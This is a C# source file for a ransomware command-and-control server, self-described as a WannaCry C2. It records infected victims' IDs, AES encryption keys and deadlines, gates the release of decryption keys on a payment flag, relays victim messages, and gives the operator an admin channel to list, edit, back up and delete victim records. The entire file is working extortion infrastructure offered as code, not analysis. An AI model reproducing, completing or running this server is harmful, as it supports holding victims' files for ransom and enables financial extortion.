using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace WannaCry_Command_and_Control_Server
{
    class Program
    {
        // WannaCry Ransomware Command and Control Server
        // Copyright Sihun All rights reserved.

        private static int main_server_port = 2560;
        private static string main_server_rsa_public_key = "";
        private static string main_server_rsa_private_key = "";
        private static string main_server_admin_aes_key = "";
        private static Dictionary<string, string> SSL_TLS_CONNECTION_INFO = new Dictionary<string, string>();
        private static readonly string main_server_data_file = "server.dbx";
        private static readonly string main_server_data_file_split = "@WNCRY@";
        private static readonly string receive_message_path = "messages";
        private static readonly string client_intfo_path = "client";
        private static readonly string client_info_backup_path = "backup";
        private static void server_data_file_read()
        {
            string fileRead = System.IO.File.ReadAllText(main_server_data_file);
            main_server_port = int.Parse(fileRead.Split(new string[] { main_server_data_file_split }, StringSplitOptions.None)[0]);
            main_server_rsa_public_key = fileRead.Split(new string[] { main_server_data_file_split }, StringSplitOptions.None)[1];
            main_server_rsa_private_key = fileRead.Split(new string[] { main_server_data_file_split }, StringSplitOptions.None)[2];
            main_server_admin_aes_key = fileRead.Split(new string[] { main_server_data_file_split }, StringSplitOptions.None)[3];
        }

        private static bool server_rsa_key_checking()
        {
            string testText = "WannaCry!";
            try
            {
                if (RSADecrypt(RSAEncrypt(testText, main_server_rsa_public_key), main_server_rsa_private_key).Equals(testText))
                    return true;
                else
                    return false;
            }
            catch (Exception)
            {
                return false;
            }
        }

        private static List<string> client_list_reload()
        {
            List<string> result = new List<string>();
            foreach (System.IO.FileInfo fi in new System.IO.DirectoryInfo(client_intfo_path).GetFiles())
                result.Add(fi.FullName);
            return result;
        }

        private static List<string> receive_message_list_reload()
        {
            List<string> result = new List<string>();
            foreach(System.IO.FileInfo fi in new System.IO.DirectoryInfo(receive_message_path).GetFiles())
                result.Add(fi.FullName);
            return result;
        }

        private static Dictionary<string, string> read_dbx_file(string file)
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            string[] value = System.IO.File.ReadAllLines(file);
            if (value.Length > 0)
            {
                int temp_int = 0;
                string temp_str = "";
                foreach (string s in value)
                {
                    if (s.Contains("~") && s.Length > 1)
                    {
                        temp_int = 1;
                        temp_str = s.Substring(1);
                    }
                    else if (s.Contains("--") && s.Length > 2 && temp_int == 1)
                    {
                        result.Add(temp_str, s.Substring(2).Replace("sp&;","\r\n"));
                        temp_int = 0;
                        temp_str = "";
                    }
                }
                return result;
            }
            else return null;
        }

        private static string RSAEncrypt(string getValue, string pubKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(pubKey);
            byte[] inbuf = (new UTF8Encoding()).GetBytes(getValue);
            byte[] encbuf = rsa.Encrypt(inbuf, false);
            return System.Convert.ToBase64String(encbuf);
        }

        private static string RSADecrypt(string getValue, string priKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(priKey);
            byte[] srcbuf = System.Convert.FromBase64String(getValue);
            byte[] decbuf = rsa.Decrypt(srcbuf, false);
            string sDec = (new UTF8Encoding()).GetString(decbuf, 0, decbuf.Length);
            return sDec;
        }

        private static string AESEncrypt(string str, string key)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
            var encrypt = aes.CreateEncryptor(aes.Key, aes.IV);
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, encrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Encoding.UTF8.GetBytes(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            String Output = Convert.ToBase64String(xBuff);
            return Output;
        }

        private static string AESDecrypt(string str, string key)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = Encoding.UTF8.GetBytes(key);
            aes.IV = new byte[] { 1, 0, 7, 3, 4, 2, 0, 3, 9, 6, 0, 6, 2, 5, 6, 8 };
            var decrypt = aes.CreateDecryptor();
            byte[] xBuff = null;
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, decrypt, CryptoStreamMode.Write))
                {
                    byte[] xXml = Convert.FromBase64String(str);
                    cs.Write(xXml, 0, xXml.Length);
                }

                xBuff = ms.ToArray();
            }
            String Output = Encoding.UTF8.GetString(xBuff);
            return Output;
        }

        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        private static string Base64Decoding(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Reading server datafile...");
            server_data_file_read();
            Console.WriteLine("[INFO] PORT --> " + main_server_port);
            Console.WriteLine("[INFO] Publickey --> " + main_server_rsa_public_key);
            Console.WriteLine("[INFO] Privatekey --> " + main_server_rsa_private_key);
            Console.WriteLine("Checking RSA key...");
            if (!server_rsa_key_checking())
            {
                Console.WriteLine("ERROR! Invalid RSA public or private key.");
                Environment.Exit(0);
            }
            Console.WriteLine("Loading client list...");
            List<string> client_list = client_list_reload();
            foreach (string client_info_file_name in client_list)
            {
                string path = client_info_file_name;
                System.IO.FileInfo fi = new System.IO.FileInfo(path);
                Console.WriteLine("    [Client] ID: " + fi.Name.Replace(".dbx", ""));
            }
            Console.WriteLine("Loading message list...");
            List<string> message_list = receive_message_list_reload();
            foreach (string message_file_name in message_list)
            {
                string path = message_file_name;
                System.IO.FileInfo fi = new System.IO.FileInfo(path);
                Console.WriteLine("    [Message] Time: " + fi.Name.Replace(".dbx", ""));
            }
            List<string> del_file_list = new List<string>();
            Thread DFL = new Thread(delegate()
            {
                while (true)
                {
                    for (int i = 0; i < del_file_list.Count; i++)
                    {
                        string s = del_file_list[i];
                        try
                        {
                            string id = new FileInfo(s).Name.Replace(".dbx", "");
                            string tof = read_dbx_file(s)["Check_Payment"];
                            string time = read_dbx_file(s)["Time"];
                            string key = read_dbx_file(s)["AES_Key"];
                            File.Delete(s);
                            File.WriteAllText(client_info_backup_path + "\\" + id + ".dbx", "~Check_Payment\r\n--" + tof + "\r\n~AES_Key\r\n--" + key + "\r\n~Time\r\n--" + time);
                            del_file_list.Remove(s);
                        }
                        catch (Exception) { }
                    }
                    Thread.Sleep(1000);
                }
            });
            DFL.Start();
            TcpListener Listener = null;
            TcpClient client = null;
            try
            {
                Listener = new TcpListener(main_server_port);
                Listener.Start();
                while (true)
                {
                    client = Listener.AcceptTcpClient();
                    Thread th = new Thread(delegate()
                    {
                        string Exception_DATA = "";
                        string Exception_SubDATA = "";
                        NetworkStream NS = null;
                        StreamReader SR = null;
                        StreamWriter SW = null;
                        TcpClient clientSocket = client;
                        NS = client.GetStream();
                        SR = new StreamReader(NS, Encoding.UTF8);
                        SW = new StreamWriter(NS, Encoding.UTF8);
                        string GetMessage = string.Empty;
                        try
                        {
                            while (client.Connected == true) 
                            {
                                client_list = client_list_reload();
                                GetMessage = SR.ReadLine();
                                if (GetMessage.Contains("[RSA]"))
                                {
                                    GetMessage = RSADecrypt(GetMessage.Substring(5), main_server_rsa_private_key);
                                    Exception_SubDATA = "[RSA]" + GetMessage;
                                    string client_id = GetMessage.Split(new string[] { "&" }, StringSplitOptions.None)[0];
                                    string client_key = GetMessage.Split(new string[] { "&" }, StringSplitOptions.None)[1];
                                    Exception_DATA = client_id;
                                    if (SSL_TLS_CONNECTION_INFO.ContainsKey(client_id))
                                        SSL_TLS_CONNECTION_INFO.Remove(client_id);
                                    SSL_TLS_CONNECTION_INFO.Add(client_id, client_key);
                                    Console.WriteLine("[Client Connection__SSL_SETTING] ID: " + client_id + " / KEY: " + client_key);
                                    GetMessage = "SSL_KEY_SETTING_SUCCESSFUL";
                                }
                                else if (GetMessage.Contains("[AES]"))
                                {
                                    string command = GetMessage.Substring(5).Split(new string[] { "&" }, StringSplitOptions.None)[0];
                                    string uuid = GetMessage.Substring(5).Split(new string[] { "&" }, StringSplitOptions.None)[1];
                                    Exception_DATA = uuid;
                                    command = AESDecrypt(command, SSL_TLS_CONNECTION_INFO[uuid]);
                                    Exception_SubDATA = command;
                                    Console.WriteLine("[Client Connection] Command: " + command + " / ID: " + uuid);
                                    if (command.Contains("GET_TIME"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(uuid))
                                            {
                                                result = read_dbx_file(path)["Time"];
                                                break;
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("CHECK_PAYMENT"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(uuid))
                                            {
                                                result = read_dbx_file(path)["Check_Payment"];
                                                break;
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("SEND_MESSAGE"))
                                    {
                                        string path = receive_message_path + "\\" + DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + ".dbx";
                                        string msg = command.Split(new string[] { "&;SPT" }, StringSplitOptions.None)[1];
                                        File.WriteAllText(path,"~ID\r\n--" + uuid + "\r\n~TOF\r\n--False\r\n~Message\r\n--" + msg + "\r\n~Return\r\n--<NULL>");
                                        message_list = receive_message_list_reload();
                                        GetMessage = Base64Encode(path);
                                    }
                                    else if (command.Contains("RETURN_MESSAGE"))
                                    {
                                        string input_path = Base64Decoding(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]);
                                        message_list = receive_message_list_reload();
                                        string result = "NOT_FOUND_MESSAGE_INFO";
                                        foreach (string message_file_name in message_list)
                                        {
                                            string path = message_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (input_path.Equals(receive_message_path + "\\" + fi.Name))
                                            {
                                                if (read_dbx_file(path)["ID"].Equals(uuid))
                                                {
                                                    result = read_dbx_file(path)["Return"];
                                                    break;
                                                }
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("CREATE_CLIENT_INFO"))
                                    {
                                        int checker = 1;
                                        string key = command.Split(new string[] { "&" }, StringSplitOptions.None)[1];
                                        string time = command.Split(new string[] { "&" }, StringSplitOptions.None)[2];
                                        string result = "FOUND_CLIENT_ID";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(uuid)) checker = 0;
                                        }

                                        if(checker == 1)
                                        {
                                            File.WriteAllText(client_intfo_path + "\\" + uuid + ".dbx", "~Check_Payment\r\n--False\r\n~AES_Key\r\n--" + key + "\r\n~Time\r\n--" + time);
                                            result = "CREATE_CLIENT_INFO_SUCCESSFUL";
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("DECRYPT"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        string get = "";
                                        string path_d = "";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(uuid))
                                            {
                                                result = read_dbx_file(path)["Check_Payment"];
                                                get = read_dbx_file(path)["AES_Key"];
                                                path_d = path;
                                                break;
                                            }
                                        }
                                        if (result.ToLower().Equals("true"))
                                        {
                                            del_file_list.Add(path_d);
                                            result = get;
                                        }
                                        GetMessage = result;
                                    }
                                    Console.WriteLine("[Client Connection__RESULT] ID: " + uuid + " / Return: " + GetMessage);
                                }
                                else if (GetMessage.Contains("[SCH]"))
                                {
                                    GetMessage = RSADecrypt(GetMessage.Substring(5), main_server_rsa_private_key);
                                    Exception_SubDATA = "[RSA]" + GetMessage;
                                    string client_id = GetMessage.Split(new string[] { "&" }, StringSplitOptions.None)[0];
                                    string client_key = GetMessage.Split(new string[] { "&" }, StringSplitOptions.None)[1];
                                    string client_time = GetMessage.Split(new string[] { "&" }, StringSplitOptions.None)[2];
                                    Console.WriteLine("[Client Connection] Command: " + GetMessage + " / ID: " + client_id);
                                    Exception_DATA = client_id;
                                    int checker = 1;
                                    string result = "FOUND_CLIENT_ID";
                                    foreach (string client_info_file_name in client_list)
                                    {
                                        string path = client_info_file_name;
                                        System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                        if (fi.Name.Replace(".dbx", "").Equals(client_id)) checker = 0;
                                    }
                                    if (checker == 1)
                                    {
                                        File.WriteAllText(client_intfo_path + "\\" + client_id + ".dbx", "~Check_Payment\r\n--False\r\n~AES_Key\r\n--" + client_key + "\r\n~Time\r\n--" + client_time);
                                        result = "CREATE_CLIENT_INFO_SUCCESSFUL";
                                    }
                                    GetMessage = result;
                                    Console.WriteLine("[Client Connection__RESULT] ID: " + client_id + " / Return: " + GetMessage);
                                }
                                else if (GetMessage.Contains("[ADM]"))
                                {
                                    GetMessage = AESDecrypt(GetMessage.Substring(5), main_server_admin_aes_key);
                                    Exception_DATA = "ADMIN_CLIENT_COMMAND";
                                    Exception_SubDATA = GetMessage;
                                    string command = GetMessage;
                                    string uuid = "ADMIN_CLIENT";
                                    Console.WriteLine("[Client Connection] Command: " + command + " / ID: " + uuid);
                                    if (command.Contains("GET_CLIENT_LIST"))
                                    {
                                        string result = "<NULL>";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (result.Equals("<NULL>")) result = fi.Name.Replace(".dbx", "");
                                            else result = result + "<ENTER>" + fi.Name.Replace(".dbx", "");
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("GET_CLIENT_INFO"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        string key = "";
                                        string id = "";
                                        string time = "";
                                        string cp = "";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]))
                                            {
                                                cp = read_dbx_file(path)["Check_Payment"];
                                                key = read_dbx_file(path)["AES_Key"];
                                                id = fi.Name.Replace(".dbx", "");
                                                time = read_dbx_file(path)["Time"];
                                                result = id + "<ENTER>" + cp + "<ENTER>" + key + "<ENTER>" + time;
                                                break;
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("EDIT_CLIENT_INFO"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        string key = "";
                                        string time = "";
                                        string cp = "";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]))
                                            {
                                                if (command.Split(new string[] { "&" }, StringSplitOptions.None)[2].ToLower().Equals("id"))
                                                {
                                                    File.Move(path, fi.DirectoryName + "\\" + command.Split(new string[] { "&" }, StringSplitOptions.None)[3]);
                                                    result = "ID_CHANGE_SUCCESSFUL";
                                                }
                                                else if (command.Split(new string[] { "&" }, StringSplitOptions.None)[2].ToLower().Equals("check_payment"))
                                                {
                                                    File.WriteAllText(path, "~Check_Payment\r\n--" + command.Split(new string[] { "&" }, StringSplitOptions.None)[3] + "\r\n~AES_Key\r\n--" + key + "\r\n~Time\r\n--" + time);
                                                    result = "CHECKPAYMENT_CHANGE_SUCCESSFUL";
                                                }
                                                else if (command.Split(new string[] { "&" }, StringSplitOptions.None)[2].ToLower().Equals("key"))
                                                {
                                                    File.WriteAllText(path, "~Check_Payment\r\n--" + cp + "\r\n~AES_Key\r\n--" + command.Split(new string[] { "&" }, StringSplitOptions.None)[3] + "\r\n~Time\r\n--" + time);
                                                    result = "KEY_CHANGE_SUCCESSFUL";
                                                }
                                                else if (command.Split(new string[] { "&" }, StringSplitOptions.None)[2].ToLower().Equals("time"))
                                                {
                                                    File.WriteAllText(path, "~Check_Payment\r\n--" + cp + "\r\n~AES_Key\r\n--" + key + "\r\n~Time\r\n--" + command.Split(new string[] { "&" }, StringSplitOptions.None)[3]);
                                                    result = "TIME_CHANGE_SUCCESSFUL";
                                                }
                                                break;
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("ADD_CLIENT"))
                                    {
                                        string result = "CLIENT_CREATE_FAIL";
                                        File.WriteAllText(client_intfo_path + "\\" + command.Split(new string[] { "&" }, StringSplitOptions.None)[1] + ".dbx", "~Check_Payment\r\n--False\r\n~AES_Key\r\n--" + command.Split(new string[] { "&" }, StringSplitOptions.None)[2] + "\r\n~Time\r\n--" + command.Split(new string[] { "&" }, StringSplitOptions.None)[3]);
                                        result = "CREATE_CLIENT_SUCCESSFUL";
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("REMOVE_CLIENT"))
                                    {
                                        string result = "REMOVE_CREATE_FAIL";
                                        File.Delete(client_intfo_path + "\\" + command.Split(new string[] { "&" }, StringSplitOptions.None)[1] + ".dbx");
                                        result = "REMOVE_CLIENT_SUCCESSFUL";
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("GET_BACKUP_LIST"))
                                    {
                                        string result = "<NULL>";
                                        foreach (FileInfo fi in new DirectoryInfo(client_info_backup_path).GetFiles())
                                        {
                                            if (result.Equals("<NULL>")) result = fi.Name.Replace(".dbx", "");
                                            else result = result + "<ENTER>" + fi.Name.Replace(".dbx", "");
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("GET_BACKUP_CLIENT_INFO"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        string key = "";
                                        string id = "";
                                        string time = "";
                                        string cp = "";
                                        foreach (FileInfo fi in new DirectoryInfo(client_info_backup_path).GetFiles())
                                        {
                                            if (fi.Name.Replace(".dbx", "").Equals(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]))
                                            {
                                                cp = read_dbx_file(fi.FullName)["Check_Payment"];
                                                key = read_dbx_file(fi.FullName)["AES_Key"];
                                                id = fi.Name.Replace(".dbx", "");
                                                time = read_dbx_file(fi.FullName)["Time"];
                                                result = id + "<ENTER>" + cp + "<ENTER>" + key + "<ENTER>" + time;
                                                break;
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("REMOVE_BACKUP_CLIENT_INFO"))
                                    {
                                        string result = "REMOVE_BACKUP_CREATE_FAIL";
                                        File.Delete(client_info_backup_path + "\\" + command.Split(new string[] { "&" }, StringSplitOptions.None)[1] + ".dbx");
                                        result = "REMOVE_BACKUP_CLIENT_SUCCESSFUL";
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("ADD_BACKUP_CLIENT_INFO"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        foreach (string client_info_file_name in client_list)
                                        {
                                            string path = client_info_file_name;
                                            System.IO.FileInfo fi = new System.IO.FileInfo(path);
                                            if (fi.Name.Replace(".dbx", "").Equals(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]))
                                            {
                                                File.Copy(path, client_info_backup_path + "\\" + fi.Name, true);
                                                result = "CLIENT_INFO_BACKUP_SUCCESSFUL";
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains("SET_BACKUP_CLIENT_INFO"))
                                    {
                                        string result = "NOT_FOUND_CLIENT_ID";
                                        foreach (FileInfo fi in new DirectoryInfo(client_info_backup_path).GetFiles())
                                        {
                                            if (fi.Name.Replace(".dbx", "").Equals(command.Split(new string[] { "&" }, StringSplitOptions.None)[1]))
                                            {
                                                File.Move(fi.FullName, client_intfo_path + "\\" + fi.Name);
                                                result = "SET_BACKUP_CLIENT_INFO_SUCCESSFUL";
                                            }
                                        }
                                        GetMessage = result;
                                    }
                                    else if (command.Contains(""))
                                    {

                                    }
                                    Console.WriteLine("[Client Connection__RESULT] ID: " + uuid + " / Return: " + GetMessage);
                                    GetMessage = AESEncrypt(GetMessage, main_server_admin_aes_key);
                                }
                                break;
                            }
                        }
                        catch (Exception e)
                        {
                            GetMessage = "EXCEPTION";
                            Console.WriteLine("[Client Connection__EXCEPTION] ID: " + Exception_DATA + " / Command: " + Exception_SubDATA + "\r\n" + e.ToString());
                            Console.WriteLine("[Client Connection__RESULT] ID: " + Exception_DATA + " / Return: " + GetMessage);
                        }
                        finally
                        {
                            SW.WriteLine(GetMessage, DateTime.Now); SW.Flush();
                            SW.Close();
                            SR.Close();
                            client.Close();
                            NS.Close();
                        }
                    });
                    th.Start();

                }
            }
            catch (Exception e)
            {
                Console.WriteLine("");
                Console.WriteLine("============================= [ ERROR! ] ============================");
                Console.WriteLine(e.ToString());
            }
            finally
            {
                Environment.Exit(0);
            }
        }
    }
}
